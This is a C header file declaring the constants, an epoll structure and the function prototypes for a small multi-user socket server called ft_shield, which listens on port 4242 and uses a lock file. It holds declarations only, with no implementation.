#ifndef FT_SHIELD_H
#define FT_SHIELD_H

#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/file.h>
#include <arpa/inet.h>
#include <sys/epoll.h>

#define LOCK_FILE "/var/lock/ft_shield.lock"
#define LOGIN "rbardet-"
#define PORT 4242
#define MAX_USER 3
#define MAX_EVENT 10
#define LIMIT_REACH "Too many user connected, retry later"
#define FAILED_CONNECTION "Failed to connect"

typedef struct {
	int fd;
	struct epoll_event event;
	struct epoll_event events[MAX_EVENT];
} EPOLL_STRUCT;

extern int userNb;

#define EPOLL_ERROR ((EPOLL_STRUCT){.fd = -1})

bool existing_lock();
void create_lock();
void delete_lock();

void run_server();

void accept_user(int sockfd, EPOLL_STRUCT epoll);
void refuse_user(int sockfd);
void disconnect_user(int userfd, EPOLL_STRUCT epoll);
void read_input(int userfd);

#endif